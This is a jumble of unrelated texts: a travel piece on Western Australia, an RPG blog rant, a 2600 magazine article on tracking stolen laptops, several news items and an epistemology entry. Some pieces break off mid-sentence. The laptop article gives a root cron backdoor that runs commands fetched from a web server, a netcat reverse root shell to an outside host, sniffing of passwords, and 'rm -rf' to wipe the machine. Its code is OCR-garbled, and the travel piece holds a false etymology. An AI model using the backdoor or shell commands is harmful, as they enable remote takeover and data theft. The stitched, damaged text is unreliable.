If you head north out of Perth it does n't take long before you enter the endless Outback .
The top one third of Western Australia lies in the tropical zone and you can even find tropical rainforests fringing the northern coastline here .
Below that you will find vast areas of grasslands ( savanna ) which look like the game reserves you find in Africa , with the exception of an innumerable amount of huge ant hills dotting the landscape intermingled with Australian fauna including kangaroos and emu .
Further south lie the deserts that Australia is famous for .
In fact the Australian deserts are the biggest in the world outside of the Sahara .
The main deserts here are the Simpson Desert , The Great Sandy Desert , The Great Victoria Desert , and the Nullabor Plain .
Nullabor means " no trees " in Latin .
These deserts come to life each Spring with the most spectacular and colourful show of wild flowers on Earth .
Western Australia also has more coastline than any other state and much of this coastline is pure white sand with sparkling clear and warm inviting water .
The catch is that many of these idyllic beaches in the north of the state are infested with sharks and other nasties .
There are still safe beaches here where you can swim and bathe , but local knowledge is important when deciding where to swim
One of the best beaches in North Western Australia is Cable Beach , located in a small outback town called Broome .
This town is marketed as an alternative to Bali in Indonesia , which is a popular overseas destination for residents of Perth , due to its close proximity with that city .
North West Cape is famous for Ningaloo Reef , which is just as spectacular as the Great Barrier Reef in Queensland , although not as extensive .
The Reef may be smaller but there is also less people and it easy to access .
This area also has some superb beaches and lagoons .
Another area of interest on the west coast is a place called Shark Bay .
This World Heritage area is very scenic , but most come here to get up close and personal with dolphins that frequent here .
Western Australia has some of the weirdest looking landscape on Earth .
One such area Purnululu National Park is home to the Bungle Bungles , a vast area of dome shaped mountains of stone which are orange in colour and lined with black stripes , caused by a type of lichen that grows on certain layers of rock .
It is quite incredible to note that the area was discovered in the 1980s and stands as a testimony to the vast unexplored areas that still exist in this state .
Cervantes National Park or the Pinnacles as they are more commonly known , is another strange work of nature .
In prehistoric times this area was once covered in forest but as Australia moved north due to continental drift this forest moved into the arid zone and the forest died .
The dead trees were replaced by sand as they wasted away and today you can see the hundreds of stone pinnacles that replaced the trees to become a petrified forest .
Everything about Western Australia is big .
If you travel along the main highway for example it is common to see Road Trains transporting goods up and down the state .
These Road Trains are trucks with 2 or 3 sometimes 4 full trailers on the back .
If you visit one of the open cast mines in the north you will see the world biggest earth moving machines , trucks with houses in them , and trains that are kilometers in length .
Following the main highway north will lead you to the Northern Territory which is northeast of this state .
South Australia lies to the southeast .
Beyond the western shoreline is the Indian Ocean and to the south of the state lies the Great Southern Ocean .
The nearest landmass to the south is Antarctica and Indonesia lies due north .

Ah , the RPG community .
No difference is too small to be an excuse to fragment it further !
Background for the Uninitiated :
There are such things as “ indie ” role - playing games , for those of you who consider using rules from Dragon Magazine in your D&D to be “ living on the edge . ”
What “ indie ” means is of course immediately up for debate ; to some folks it ’s any games from single person or small shops ( e.g. not from a big publisher ) .
Of course , in the RPG world pretty much everyone but WotC and White Wolf has less than a handful of employees .
Some people draw a distinction between “ storygames ” and “ traditional ” RPGs , which is also a very arguable distinction between RPGs that are more story - oriented , or , frankly , just more “ newfangled ” and games that seem to be constructed just like every RPG since 1970 .
The Forge ( aka indie- rpgs.com ) is a forums site run by Ron Edwards , author of the RPG Sorcerer , which is for certain indie game design folks to collaborate .
( I say “ certain ” because they have a very specific view of what ’s indie and other views are not welcome . )
Indie Press Revolution is a distributor that carries indie titles , from the FORGE and others .
There ’s some overlap in publishers with the mega-RPG sales site RPGNow.com , but they focus on small press titles .
They ’ve grown quickly ; now my FLGS ( Rogue ’s Gallery , in Round Rock , TX ) has an IPR mini-section .
Anyway , on the FORGE site , Ron Edwards has declared IPR not “ indie ” enough and is starting his own distributor ( well , a couple hours a week of some chick named Meg ) to do fulfillment for him and a couple other companies .
He ’s concerned that his “ definition of independence ” is a low priority for IPR taking on new publishers , and that his books are not “ front and center ” on the IPR home page .
Unlike the RPGPundit , who dismisses the whole kerfluffle as storygamer silliness , I enjoy some indie games , storygames , whatever you want to call them .
I own octaNe , InSpectres , Lacuna , Do n’t Rest Your Head , Spirit of the Century , some of the GUMSHOE titles …
In terms of older games I ’d consider indie , Feng Shui changed how I play all RPGs .
Anyway , this whole thing seems to be a case of ego run wild .
I defy you to read the FORGE thread and not say “ Man , that Ron guy is being an assmaster . ”
He claims to not have a beef , but then casts IPR as some huge demon corp with tremendous overhead used to fleece the publishers , then when one of the IPR guys very politely responds to say “ we ’re like two people and I pull only 10 hrs / week salary from it ” , goes into full attack dog mode , even threatening to moderate him so he ca n’t reply .
Stay classy , Ron .
He claims that “ No one owns independence ” but you get the clear idea he thinks he does , or at least is its pope .
For someone that ’s published exactly one game , that ’s a bit of a tall order IMO .
And franky , it ’s not a good idea to split off on your own .
I ’m sorry his game is n’t “ front page ” on the IPR site any more .
But there ’s a reason you get mileage out of a good distributor – their reach and quality .
IPR has become ( like RPGNow and Paizo.com , at least for me personally ) a destination to go look at when you ’re in the market for games .
They have a great and usable Web site with helpful features , a problem - free store , they take credit cards and not just PayPal – all that stuff that junky little one - man Web pages do n’t have .
I mentioned there ’s an IPR mini-section in my FLGS .
All that gets your game out to people .
And the woods are littered with well - meaning self - fullfilment folks who just end up screwing it up and alienating customers and publishers .
Like everything else , fulfillment / distribution is a discipline and people who specialize in it will do it better – more reliable , get you your books faster , etc .
In fact , Pelgrane Press posted an interesting thing to the FORGE about their distribution model and how they do some self - fulfillment * and * IPR – their self - fulfillment was plagued by the expected problems ( bad store software that ca n’t calculate shipping , etc. ) and reasonable costs .
If you do n’t like the store site not having your books on the front page , or not making a “ shared and enticing concept , ” have a Web site of your own to push it – I do n’t know why you have to get into the distribution business for that .
That ’s sour grapes , not good business .
Some of the folks supporting this make the somewhat odd claim that “ we do n’t want to get our games out to just anybody , but only to those who would enjoy them . ”
If you think only your fellow FORGEites can appreciate your brilliance , just give them all PDFs , it ’s a quite small community .
I think that ’s an inherently stupid and elitist attitude to talk about who ’s worthy to buy your game .
“ Some dude in some game shop in Iowa is obviously some redneck retard who could never enjoy my game without being a part of the FORGE community for five years first . ”
Do you think so little of your product that you think there might not be others out there who would enjoy and appreciate it if they had access to it ?
And they are proud their new scheme “ is n’t a business model . ”
You know , things are profitable because they provide something people percieve to be of value .
Many big companies got big because it was doing things better for their customers than the smaller one .
Shocking , I know .
On the one hand , so someone ’s doing something stupid for fulfillment , welcome to small business .
But the real risk is that this is going to be used as an excuse for infighting , fragmentation , or “ purges ” as RPGPundit puts it .
Sadly , my many years experience with the online RPG communities leads me to believe that ’s a likely outcome .
The RPG community is very small .
The indie game community is even smaller .
Do n’t let someone with a big ego goad you into fighting with each other .
There is value in collaboration and in dealing with people that , God forbid , do not share the 100 % same worldview that you do .
In fact , it might * improve * what you produce .
This isolationist mindset is not useful and will generate bad feelings and a weaker indie RPG industry .
If you would like to see more people in general play RPGs , and see more RPG players play innovative , new games – do n’t fall into this trap .
Laptop Security
by Fernando
[ Originally appeared in 2600 , Volume 21 , No. 3 , Fall 2004 ]
Having purchased a $ 2,000 Apple Powerbook 04 , I have been thinking about how to protect my investment .
If I take my laptop on a trip and it gets stolen , I want to know as much as possible about where my computer is and who is using it .
This tutorial applies equally well to any Linux , BSD , or Solaris laptop as well .
Before I get into the details , I want to mention that this system depends on a thief who does not erase your hard drive and then proceeds to connect to the Internet .
Some thieves may steal computers for the information con tained therein , but many others will steal computers to sell on eBay .
The latter of these thieves are the ones who may be interested in erasing hard drives , and thus those are the ones we are interested in stopping .
To prevent a thief from easily erasing your hard drive , I would recommend putting a pass word on your BIOS .
To do this on modern Macs requires you to boot into Open Firmware ( when the computer loads , press Command +
Option + o + F ) and typing " password " .
After setting the password , type " setenv security - mode com mand " and finally " reset- all " to restart your computer .
If you do not know the firmware password , you will not be able to boot the computer from a CD or external hard drive in order to reload the OS .
The only way to forcibly re move this password is to change the amount of RAM in the computer and then clear the PRAM three times ... a piece of trivia that a common thief is unlikely to know .
PC BIOS 's are easy to secure as well , but since they differ per BIOS , I will let you find out on your own how to do that .
Another security precaution when using Mac OS X is to make sure that you must type your password any time you want to - make a change to the system preferences .
Otherwise all you would have to do is go to the System Preferences in the Classic panel and select a Mac OS 9 CD in order to erase the hard drive .
I would also recommend password protect ing every user account on your computer and requiring a user to type their password before logging in .
This protects any information on your computer , as long as the thief does n't get root access .
Then , enable a password - less guest account on your laptop .
Of course , make sure that this account is severely limited in what it can do , but if a thief can't easily erase your hard drive and has access to a guest account , they may decide to give up trying to erase your hard drive and start to just play around with your computer .
Hopefully in the process they will connect to the Internet .
The Beacon
The basic idea behind this is to run a cron job as root every five or ten minutes that runs a simple command .
This command acts as a beacon .
*/5 * * * * curl -s http://somesite.com/tracker/
> /dev/null
With this command , every five minutes the computer will attempt to access a page you set up that tracks IP addresses .
The -s parameter will suppress any errors .
Listing 1 is a simple tracker script written in PHP that logs the event and mails someone if the IP address of the client has not been seen before .
<? php ini_set ( " diplay _errors " , 0 ) i ; // make sure there is no unexpected output while in production mode $ theIP = $ _SERVER [ ' REMOTE ADDR ' ] ; $ips = " ips.txt " ; // a file writable by the web server $ list = file ( $ips ) ; foreach ( $ list as $ key => $ ip ) { $ list [ $key ] = trim ( $ip ) ; } if ( ! in_array ( $ theIP , $ list ) ) { array - push ( $ list , $ theIP ) ; mail ( " you@somesite.com " , " New IP Address " , " {$theIP} -> " . gethostbyaddr ( $ theIP ) , " From:me@mycomputer . com " ) ; exec ( " echo '{ $theIP} ' >> { $ips} " ) ; } ?>
The Enhanced Beacon
The simple beacon is great for informative purposes .
But what if you want to take proactive action in the retrieval of your computer ?
Try this shell script ( beacon.sh ) :
#f/bin/sh tracker='/usr/bin/curl -s http://somesite. com / tracker / ' if [ " tracker " ] then $ tracker fi
Then run a root cron job :
*/5 * * * * /usr/local/bin/beacon.sh >
/dev/null
This script downloads the page http://somesite.com/tracker/, just like the simple beacon .
But if the output of that page is not empty , it will execute the output of that page as root .
As you can see , this is a backdoor into your computer , so it is imperative that you have a large amount of trust with http://somesite.com/.
Furthermore , you want to design the enhanced tracker script very carefully , since it potentially has full root access to your computer .
I cannot emphasize this enough .
This tool is very powerful , but along with this power comes a lot of danger , so be very careful .
Listing 2 has an enhanced version of the tracker script that allows one to output a command when the script is accessed .
<?php ini_set ( " diplay_errors " , 0 ) ; // make sure there is no unexpected output while in production mode $ theIP = $ _SERVER [ ' REMOTE ADDR ' ] ; $ips = " ips.txt " ; // a file writable by the web server containing a list of IP addresses that have visited this page $ command_fiie = " command . txt " ; // a file writable by the web server that will contain a command to execute on the server $ list = file ( $ips ) ; $ command = file ( $ command file ) ; foreach ( $ list as $ key => $ ip ) { $ list [ $key ] = trim ( $ip ) ; } $ command = trim ( $ command [ 0 ] ) ; if ( ! empty ( $ command ) ) { exec ( " echo > $ command_file " ) ; echo $ command ; mail ( " you@somesite.com " , " Command succeeded " , " The command \ " {$ command}\ " has been run on { $theIP} " . gethostbyaddr( $theIP ) , " From:me@mycomputer.com " ) ; } if ( ! in_array ( $ theIP , $ list ) ) { array_push ( $ list , $ theIP ) ; mail ( " you@somesite.com " , " New IP Address " , " {$theIP} - > " . gethostbyaddr( $theIP ) , " From:me@mycomputer.com " ) ; exec ( " echo '{ $theIP} ' » ( $ips} " ) ; } ?>
The Tracker
Before your computer is stolen , there is hardly any reason to keep track of IP addresses and probably never any reason to run a command through a backdoor as root , so I would suggest that you make http://somesite.com/tracker/
a static page with one blank line as its content .
Then , if you are ever unlucky enough to have your computer stolen , change the tracker page to be the dynamic script that tracks IP addresses .
Fun With Thieves
We all know the hacker ethic that prevents us from listening to and messing with other people 's computers .
But if a thief takes your computer , it is a free target with the advantage of knowing all the passwords to the main accounts on the computer and having root access .
So let me list a couple of fun things that one could do .
Where Is Your Computer ?
Even if you only choose to use the simple beacon , you can track some more interesting information , like your laptop 's geographicallocation .
You could integrate NetGeo into your tracking script using a class like netgeoclass ( http://www. phpclasses.org/browse/package514.html ) .
Or , you can just go to http://www.whois.sc/192.168.1.1
( of course replacing the IP with the thiefs IP ) and that site will tell you the geographic location of that IP address .
Geographic locators based on IP addresses are not always perfect .
For example , NetGeo thinks that I live a thousand miles away from my actuallocation .
But a lot of the times it is correct .
At the very least , it will tell you who is in control of that class of IP addresses , giving you a phone number and email address of someone that would have more specific information .
Reverse Telnet
Most people do n't run an SSH server from their laptops , but even if you did , what if the thief is smart enough to be behind a firewall ?
Netcat ( http://www.atstake.com/research/tools/network_utilities/) is a very versatile network utility that can help you connect with a root shell that even a strict firewall could n't protect against .
I learned the following information from O'Reilly 's OnLamp.com ( http://www.onlamp.com/pub/a/onlamp/2003/05/29/netcat.html).
Unfortunately for our purposes , the version bundled with Mac OS 10.3 was not built with an option that enables reverse telnet .
So on your laptop , download Netcat and edit the Makefile to contain a new line : DFLAGS = - DGAPING_SECURITY_HOLE
Then type " make generic ; sudo mv nc lusr / local / bin " .
Now on whatever computer you happen to be on , make sure that you do n't have a web server running and type " nc - vv - 1 - p 80 " .
Then edit the command file on somesite.com for the tracker script ( command. txt in my example code ) to contain the command " /usr/local / bin/nc 192.168.1.1 80 -e /bin /bash " where 192.168.1.1 is the current external IP address of the computer you are on .
Your computer must be one ' that is directly connected to the Internet , not going through a firewall and definitely not NAT'ed .
This is because you are setting up a server on your computer that your laptop is then going to connect to and offer a bash shell .
Wait for the confirmation email and viola , you now have a root shell into your computer .
The reason we use port 80 is because not even the strictest firewall is ever going to block access to port 80 because it is used for web traffic .
Packet Sniffing
All Mac OS X computer have tcpdump on them .
You can glean a lot of information ( websites , usernames , passwords , etc. ) from this program .
If you happen to have installed a higher - Jevel packet sniffer like Ethercap ( http://ettercap.sf.net/ or through Fink , http:// -fink.sf.net / ) installed , the process of sifting through packets is simplified .
I do n't know the law very well , but if you want to be sure that this is OK to do and that the thief wo n't win a lawsuit against you later for sniffing his Internet traffic from your computer ( a surprisingly likely scenario ) , create a desktop picture for your guest account ( the only one the thief has access to ) that has something to the effect of :
" All information passed through this computer may be monitored by its owner . "
Worst Case Scenario
Let 's say you have talked to all the authorities , you know this guy 's name , you know where he lives , but nobody will help you retrieve your computer .
As long as your computer is insured , you have nothing to lose .
After reverse tel netting into your computer , you can tar all your user information ( " tar cfz Itmp/data.tgz IUsers / myusername " ) .
Then , from your laptop , scp it to your new computer ( " scp /tmp/data.tgz 192.168.1.1 : " ) and leave the thief with nothing using the dreaded remove everything on the computer command ( rm - rf I ) .
Not being able to boot your computer from a CD , and not having a single file left on your laptop , the thief now has a very expensive piece of garbage , and thanks to your insurance company and Steve Jobs , you have a bright new shiny laptop and , most importantly , all of your old personal information .
Conclusion
Now that I have protected my investment , I feel free to take my laptop wherever I go .
Hopefully , none of you will ever have to use the information here .
But if you do , I hope you feel protected too .
Some of the obituaries these days are n’t in the newspapers but are for the newspapers .
The Seattle Post - Intelligencer is the latest to pass away , save for a remnant that will exist only in cyberspace , and the public is increasingly seeking its news not from mainstream television networks or ink - on - dead - trees but from grazing online .
When we go online , each of us is our own editor , our own gatekeeper .
We select the kind of news and opinions that we care most about .
Nicholas Negroponte of M.I.T. has called this emerging news product The Daily Me .
And if that ’s the trend , God save us from ourselves .
That ’s because there ’s pretty good evidence that we generally do n’t truly want good information  but rather information that confirms our prejudices .
We may believe intellectually in the clash of opinions , but in practice we like to embed ourselves in the reassuring womb of an echo chamber .
After spending thirteen years with my addiction and struggling to get by , I knew now was the time to try and help people .
I know how hard it is to deal with addiction ; Xanax and I were best friends .
At least that ’s what I thought .
But a best friend would n’t abuse you like that .
A best friend would n’t take over
Apple 's iPhone application store is as crowded as a Beyonce concert , with more than 20,000 apps available .
But one independent developer still managed to rake in $ 600,000 in a single month with a single iPhone game .
Ethan Nicholas , developer of a tank artillery game called iShoot , told Wired.com he quit his job the day his app rose to No. 1 in the App Store , earning him $ 37,000 in a single day .
" I 'm not going to be a millionaire in the next month , but I 'd be shocked if it did n't happen at the end of the year , " he said in a phone interview .
" If it were n't for taxes I would be a millionaire right now . "
Until recently , there has been no realistic way for individual programmers to make serious money on their own .
Most of the software market is dominated by big companies , and the traditional distribution method for independent developers — shareware — is n't conducive to striking it rich .
By contrast , Apple 's iTunes App Store provides a platform for marketing , selling and distributing software ; all a developer needs to provide is a good idea and some working code .
Nicholas ' success story proves that there 's still plenty of potential to strike it rich in Apple 's seven - month - old App Store .
In September , iPhone developer Steve Demeter said he made $ 250,000 in just two months with his puzzle game Trism .
But as the App Store expanded rapidly , many developers thought the store would get too crowded with apps and business would inevitably slow down .
It was n't easy for Nicholas , either .
After getting off his shift as an engineer at Sun Microsystems , he worked on iShoot eight hours a day , cradling his 1 - year - old son in one hand and coding with the other .
He did n't have the money to buy books to learn how to write an iPhone app , so he taught himself by reading websites .
When iShoot launched in October , business was slow for a while .
And then Nicholas found some spare time to code a free version of the app — * iShoot Lite , * which he released January .
Here 's how that helped : Inside *iShoot Lite *he advertised the $ 3 , full version of iShoot .
Users downloaded the free version 2.4 million times .
And that led 320,000 satisfied iShoot Lite players to pay for iShoot .
The game soared to the No. 1 spot — and it stayed there for 26 days .
It 's only February , so Nicholas is still awaiting payment from Apple , and he could n't provide documentation to substantiate his earnings .
However , Media Bistro reporter Bryan Barletta confirmed that * iShoot Lite * was No. 1 for about three weeks .
As of this writing , iShoot sits at No. 6 in the App Store 's top 25 paid apps .
Rana Sobhany , vice president of iPhone app analytics company Medialets , said the math made sense and Nicholas ' success is very believable .
Nicholas ' story shows how a clever marketing strategy can pay off with money and recognition on the iPhone store — and he did n't even have to hire a PR agent .
He said the ingredients to his success were simply word of mouth , luck and a quality game .
What compelled him to code an iPhone game ?
Hard times for him and his family — and he was inspired by Trism , he said .
" I never expected to get anywhere near where I did , " Nicholas said .
" And of course I 've more than doubled [ what Trism accomplished ] in one month . "
Despite nearly becoming a millionaire , Nicholas said he and his family have n't made any lifestyle changes — yet .
The first item on his agenda is to hire a nanny .
UPDATE 2/13/2009 : Nicholas has posted a response , below , to the many comments on this story .

Nasa 's Discovery space shuttle has arrived at the International Space Station ( ISS ) .
The shuttle crew is delivering a final pair of solar arrays , which will provide the necessary power for the orbiting platform to expand .
The shuttle has also dropped off Koichi Wakata , the first Japanese astronaut to live aboard the station .
In his first public statement about the sacking of Luiz Felipe Scolari as Chelsea 's manager , the club 's chief executive , Peter Kenyon , has confirmed that the decision was taken by Chelsea 's owner , the Russian oligarch Roman Abramovich .
Kenyon , who was on holiday at the time , has insisted , however , that Abramovich did discuss the sacking with him , on the telephone , during the night following Chelsea 's 0 –0 draw with Hull City on 9 February .
" A decision was made to which we were all party , by the owner , which is the natural and correct way for it to happen , " Kenyon says , in an interview to be published next week in Esquire magazine .
The interview , in which Kenyon discusses his own career and philosophy , illustrates clearly the tensions beating at the heart of Chelsea – between Abramovich 's driving impatience for success and Kenyon 's conviction that money cannot buy it and long - term planning is essential .
In seven trophy - laden years with Sir Alex Ferguson at Manchester United , Kenyon learned the central importance to a football club of appointing the right manager , and sticking with him .
" You look at Ferguson , " Kenyon says admiringly , " he does it the way everybody would like to do it .
Continuity is a big issue in football . "
Having sacked the Chelsea manager he inherited , Claudio Ranieri – " ruthlessly , " Kenyon admits – he identified Jose Mourinho as the man to build sustained success for the oligarch 's club .
When Abramovich and Mourinho began to clash , Kenyon says he played the diplomat , and that Mourinho stayed longer , until the start of the 2007 - 08 season , as a result .
He is frank about Mourinho 's successor , confirming that Avram Grant was Abramovich 's appointment , and giving the Israeli scant credit for last season , when Chelsea finished second in the Premier League and lost the Champions League final to Manchester United on penalties .
Kenyon states that the club's " organisation " had " greater input " than the manager , who was " not the man " for Chelsea .
The bulk of the interview took place a fortnight before Scolari was sacked , and Kenyon was insisting then that the club would not be parting company with the manager , Brazil 's former World Cup winning coach whom Kenyon believed could replicate Mourinho 's two Premier League championships .
Despite widespread stories that several players were dissatisfied with Scolari 's methods , Kenyon said Chelsea had to show patience , give the new man time to adjust to club management , and see Chelsea into a period of stability .
" To achieve what we want to achieve , we can't just keep changing managers every year , " Kenyon maintained .
" That does not work . "
Scolari's appointment was , he said : " For longer than the Christmas period or for 2010 .
Why are we surprised that a guy who managed successfully at international level , that moving to league level is a bit of a change ?
That was one of our considerations .
What you are looking for is core competence and core values , that this guy can do the job .
And you know what : he will . "
Kenyon said he was confident that when the interview was published this month , Scolari would still be Chelsea 's manager .
But then he laughed , and said : " There 's a headline in the making . "
The headline which has not followed Scolari 's sacking is the one some predicted then , that Kenyon himself would trail the Brazilian out of the Stamford Bridge door , because Abramovich 's decision had undermined him .
Kenyon has stayed , but the episode has clearly exposed the politics at Chelsea , where the chief executive , wedded to a long - term vision , is subject to his boss 's more urgent instincts .
Even the original 10 - year plan , to launch Chelsea into a top European club fuelled by the oligarch 's oil billions yet with the famous pledge that Chelsea would become self - financing by 2010 - 11 , was , Kenyon reveals , his idea , which he talked Abramovich into .
" Just because you have £ 1bn or £ 12bn does n't mean you can win , " Kenyon explains of their original discussions , after Abramovich bought the club from Ken Bates in 2003 .
" That comes with time and structure , investing in facilities as well as players . "
Abramovich " signed up for the 10 - year plan " , Kenyon said but he added a qualification which highlights the pressure and tensions at Chelsea .
" Roman 's demand was that we are not going to wait nine years nine months for success . "
So Chelsea embarked on their bid for football domination , with the oligarch , who had become an overnight billionaire in Russia courtesy of Boris Yeltsin 's cosy state industry sell - offs , hungry for similar instant success .
Kenyon , the English business executive who worked for 25 years in industry before his seven at Manchester United , is schooled in more conventional planning including , in football , allowing the right manager the time to build an empire .
Kenyon does not deny that he was talking to Mourinho in 2004 even while Ranieri was still at Stamford Bridge .
" You have to be ruthless , " Kenyon maintains .
" You have to be fair , that is an important value I have , but you should n't mix that up with being soft . "
He looks back at Mourinho 's three years " with great fondness , " although he claims not to regret that the Portuguese coach left , because of the need to " move on " .
The period since can be read as a turbulent struggle to find Mourinho 's replacement .
Kenyon is clear that Grant , whom Abramovich championed , was not the right calibre .
Asked whether Grant deserves credit for Chelsea coming so close in both the Premier and Champions Leagues last season , Kenyon says : " That season underpinned where we as an organisation had got to .
I think the manager had some input ; I have to say I think the organisation had a greater input . "
By that , Kenyon is understood to mean that he and his senior executives helped keep the players together after Mourinho left , giving Grant time to win them over .
Asked whether it was unfair to sack Grant , after the team performed so well under him , Kenyon answers simply " No . "
When Chelsea dispensed with Grant and secured Scolari , Kenyon was happy he had a world - renowned and universally respected manager , and was adamant Chelsea would resist growing pressure to sack Scolari during the run of indifferent form .
When Abramovich did sack the manager just two weeks later , it was assumed Kenyon would have given Scolari more time , but Chelsea argue now that the decision was justified because this season was in danger of being lost and the team 's spirit and performances have improved greatly under Guus Hiddink .
If Hiddink abides by his own pledge to leave Stamford Bridge at the end of the season , then , as Ferguson is entering his 24th season in charge at United , Arsène Wenger his 14th with Arsenal , Rafael Benítez his sixth at Liverpool with another five - year contract signed , Chelsea will be starting with their sixth manager since 2003 .
That averages one a year since Abramovich bought Chelsea for £ 59 m and Kenyon joined him from United to tell the oligarch it would take patience , stability and 10 years to build the foundations for success .
A novel idea :
The machine that can print off any book for you in minutes
It promises to bring the world of literature to the ordinary book - buyer at the touch of a button .
In the time it takes to brew a cappuccino , this machine can print off any book that is not in stock from a vast computer database .
The innovation , launched by book chain Blackwell yesterday , removes the need to order a hard - to - find novel , or the wait to buy one that has sold out .
The EBM prints off a whole book in the time it takes to make an espresso
Even out - of - print works can be printed off in minutes .
The Espresso Book Machine will also benefit aspiring novelists who can walk in to a shop with a CD of their work and have their book professionally printed in minutes .
The cost of buying a book will be generally the same as if it were in stock .
Currently there are 400,000 books ready to be be downloaded .
Blackwell hopes that by summer , one million will be available .
It has bought one of the machines for its store on Charing Cross Road in Central London , but if it is a success then more could appear at shops across the country .
The machine is able to bring many rare and out - of - print texts back into production in under five minutes
The machine , which resembles an industrial photocopier and printer , prints 105 pages a minute , or one book every five minutes or so .
Blackwell 's aim is that the customer will be able to browse a catalogue in a kiosk next to the machine then press ' Make Book ' and watch as their novel is created .
First the cover is run off , then the pages are printed and collated .
The pages are then clamped and glue applied to the spine .
In the final stage , the pages are stuck to the cover before being trimmed to size from A4 .
The completed book then pops out of a slot in the side of the machine .
Blackwell believes the EBM will allow it to exact revenge on the supermarkets and online retailers .
Aspiring novelists can bring in a CD of their work and print out a bound copy
Tesco , for example , offers aggressive discounting while Amazon has teamed up with second - hand shops and independent sellers to provide an enormous variety of books at knock - down prices .
Five years ago , only 7 per cent of books were bought online .
By last year , that was 14 per cent .
In December , the value of books sold on the high street was down 12.7 per cent year on year .
Andrew Hutchings , of Blackwell , said : ' Companies such as Amazon have been offering a very competitive service but you still have one or two days to wait from ordering the book until it arrives .
' With the Espresso Book Machine you can order it and have it in your hand within a few minutes .
Having books printed on - demand also reduces the carbon footprint and cuts down on the number that are pulped or sent back . '
Out - of - copyright books will be sold at 10 p a page , meaning a 300 - page book would be £ 30 , although Mr Hutchings hopes the cost will come down .
All other books will cost the same as if they were bought off the shelf .

That 's about it for caveats .
While it 's obviously a ploy to get you into their stores and browsing their shipping / printing / presenting wares , it probably wo n't be the kind of mob scene you might have seen at free Grand Slam day , given that you 'd have to have a resume ready to print to cash in .
For those on the hunt for an elusive gig in our new , semi- busted economy , it could also be a serious decent money saver .

The Dark Knight director Christopher Nolan ’s next film , the sci-fi action film Inception has gained its dashing male lead with Leonardo DiCaprio .
According to Variety , DiCaprio is set to star and will begin shooting later this year .
It ’s ( as of now ) a departure for Nolan from working with Christian Bale after three films in a row , but it nevertheless sounds good to me .
The film , announced by Warner Bros last month , was described as “ a contemporary sci- fi actioner set within the architecture of the mind . ”
I like this casting , as DiCaprio tends to choose his projects fairly well and his presence usually means that a film will at least have some ambition to it even if it does n’t exactly hit home ( Revolutionary Road anyone ? ? ) .
I ’m liking the sound of this one .

The term “ epistemology ” comes from the Greek words “ episteme ” and “ logos ” .
“ Episteme ” can be translated as “ knowledge ” or “ understanding ” or “ acquaintance ” , while “ logos ” can be translated as “ account ” or “ argument ” or “ reason ” .
Just as each of these different translations captures some facet of the meaning of these Greek terms , so too does each translation capture a different facet of epistemology itself .
Although the term “ epistemology ” is no more than a couple of centuries old , the field of epistemology is at least as old as any in philosophy .
[ 1 ]
In different parts of its extensive history , different facets of epistemology have attracted attention .
Plato ’s epistemology was an attempt to understand what it was to know , and how knowledge ( unlike mere true opinion ) is good for the knower .
Locke ’s epistemology was an attempt to understand the operations of human understanding , Kant ’s epistemology was an attempt to understand the conditions of the possibility of human understanding , and Russell ’s epistemology was an attempt to understand how modern science could be justified by appeal to sensory experience .
Much recent work in formal epistemology is an attempt to understand how our degrees of confidence are rationally constrained by our evidence , and much recent work in feminist epistemology is an attempt to understand the ways in which interests affect our evidence , and affect our rational constraints more generally .
In all these cases , epistemology seeks to understand one or another kind of cognitive success ( or , correspondingly , cognitive failure ) .
This entry surveys the varieties of cognitive success , and some recent efforts to understand some of those varieties .
1. The Varieties of Cognitive Success
There are many different kinds of cognitive success , and they differ from one another along various dimensions .
Exactly what these various kinds of success are , and how they differ from each other , and how they are explanatorily related to each other , and how they can be achieved or obstructed , are all matters of controversy .
This section provides some background to these various controversies .
1.1 What Kinds of Things Enjoy Cognitive Success ?
Cognitive successes can differ from each other by virtue of qualifying different kinds of things .
For instance , a cognitive success — like that of making a discovery — may be the success of a person ( e.g. , Marie Curie ) , or of a laboratory ( Los Alamos ) , or of a people ( the Hopi ) , or even , perhaps , of a psychological fragment of a person ( the unconscious ) .
But some kinds of cognitive success — like that of having successfully cultivated a highly discriminating palate , say — may be the success of a person , and perhaps even of a people , but cannot be the success of a laboratory or of a psychological fragment .
And other kinds of cognitive success — like that of being conclusively established by all the available evidence — may be the success of a theory , but can not be the success of a person — or like that of being epistemically fruitful — may be the success of a research program , or of a particular proof - strategy , but not of a theory .
Indeed , there is a vast range of things , spanning different metaphysical categories , that can enjoy one or another kind of cognitive success : we can evaluate the cognitive success of a mental state ( such as that of believing a particular proposition ) or of an act ( such as that of drawing a particular conclusion ) , or of a procedure ( such as a particular procedure for revising degrees of confidence in response to evidence , or a particular procedure for acquiring new evidence ) , or of a relation ( such as the mathematical relation between an agent ’s credence function in one evidential state and her credence function in another evidential state , or the relation of trust between one person and another ) .
Some of the recent controversies concerning the objects of cognitive success concern the metaphysical relations among the cognitive successes of various kinds of objects :
Does the cognitive success of a process involve anything over and above the cognitive success of each state in the succession of states that comprise the execution of that process ?
[ 2 ]
Does the cognitive success of a particular mental state , or of a particular mental act , depend upon its relation to the larger process in which it exists ?
[ 3 ]
Is the cognitive success of an organization constituted merely by the cognitive successes of its members , or is it something over and above those individual successes ?
[ 4 ]
Is the cognitive success of a doxastic agent completely explicable in terms of the successes of its doxastic states , or vice versa ?
And either way , what sorts of doxastic states are there , and with respect to what kinds of possible success are they assessible ?
The latter dispute is especially active in recent years , with some epistemologists regarding beliefs as metaphysically reducible to high credences , [ 5 ] while others regard credences as metaphysically reducible to beliefs about probabilities ( see Byrne in Brewer & Byrne 2005 ) , and still others regard beliefs and credences as related but distinct phenomena ( see Kaplan 1996 , Neta 2008 ) .
Other recent controversies concern the issue of whether it is a metaphysically fundamental feature of the objects of cognitive success that they are , in some sense , supposed to enjoy the kind of cognitive success in question .
For instance , we might think that what it is for some group of people to constitute a laboratory is that the group is , in some sense , supposed to make discoveries of a certain kind : that is the point of bringing that group into collaboration in a particular way , even if the individuals are spread out across different continents and their funding sources diverse .
But even if a laboratory is plausibly characterized by a norm to which it is answerable , is something analogous true of the other objects that can enjoy cognitive success ?
Is it , for instance , a metaphysically fundamental feature of a belief that it is , in some sense , supposed to be knowledge ? [ 6 ]
Or can belief be metaphysically characterized without appeal to this norm ?
Is it , for instance , a metaphysically fundamental feature of a person that such a creature is , in some sense , supposed to be rational ? [ 7 ]
Or can persons be metaphysically characterized without appeal to this norm ?
Similar disputes arise for the other objects of cognitive success : to what extent can we understand what these objects are without appeal to the kinds of success that they are supposed to enjoy ?
